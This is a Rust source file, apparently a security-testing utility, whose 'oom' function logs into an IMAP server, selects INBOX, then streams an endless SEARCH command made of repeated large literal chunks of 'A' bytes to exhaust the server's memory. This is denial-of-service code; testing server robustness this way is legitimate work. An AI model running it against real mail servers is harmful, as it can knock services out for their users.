use imap_next::{
    client::{Client, Event, Options},
    stream::Stream,
};
use imap_types::{
    command::{Command, CommandBody},
    mailbox::Mailbox,
    response::{Status, StatusBody, StatusKind, Tagged},
};
use log::info;
use tokio::{io::AsyncWriteExt, net::TcpStream};
use tracing::{error, warn};

pub(crate) async fn oom(host: &str, username: &str, password: &str, chunk_size: u32) {
    let mut stream = Stream::insecure(TcpStream::connect(host).await.unwrap());
    let mut client = Client::new(Options::default());

    let _ = loop {
        match stream.next(&mut client).await.unwrap() {
            Event::GreetingReceived { greeting } => break greeting,
            event => println!("unexpected event: {event:?}"),
        }
    };

    client.enqueue_command(
        Command::new(
            "A1",
            CommandBody::login(username.to_string(), password.to_string()).unwrap(),
        )
        .unwrap(),
    );

    loop {
        match stream.next(&mut client).await.unwrap() {
            Event::CommandSent { .. } => {}
            Event::StatusReceived {
                status:
                    Status::Tagged(Tagged {
                        tag,
                        body: StatusBody { kind, .. },
                    }),
            } if tag.as_ref() == "A1" => {
                if kind == StatusKind::Ok {
                    client.enqueue_command(
                        Command::new(
                            "A2",
                            CommandBody::Select {
                                mailbox: Mailbox::Inbox,
                            },
                        )
                        .unwrap(),
                    );
                    break;
                }

                error!("LOGIN failed");
                return;
            }
            event => warn!(?event, "unexpected event"),
        }
    }

    loop {
        match stream.next(&mut client).await.unwrap() {
            Event::CommandSent { .. } => {}
            Event::DataReceived { .. } => {}
            Event::StatusReceived {
                status:
                    Status::Tagged(Tagged {
                        tag,
                        body: StatusBody { kind, .. },
                    }),
            } if tag.as_ref() == "A2" => {
                if kind == StatusKind::Ok {
                    break;
                }

                error!("SELECT failed");
                return;
            }
            Event::StatusReceived { .. } => {}
            event => warn!(?event, "unexpected event"),
        }
    }

    stream.stream_mut().write_all(b"A2 SEARCH").await.unwrap();

    let data = b"A".repeat(chunk_size as usize);

    loop {
        stream
            .stream_mut()
            .write_all(format!(" BODY {{{}}}\r\n", chunk_size).as_bytes())
            .await
            .unwrap();

        loop {
            match stream.next(&mut client).await.unwrap() {
                Event::ContinuationRequestReceived { .. } => {
                    info!("continuation received");

                    println!("Press ENTER to continue");
                    {
                        let mut line = String::new();
                        std::io::stdin().read_line(&mut line).unwrap();
                    }

                    stream.stream_mut().write_all(&data).await.unwrap();
                    break;
                }
                event => warn!(?event, "unexpected event"),
            }
        }
    }
}
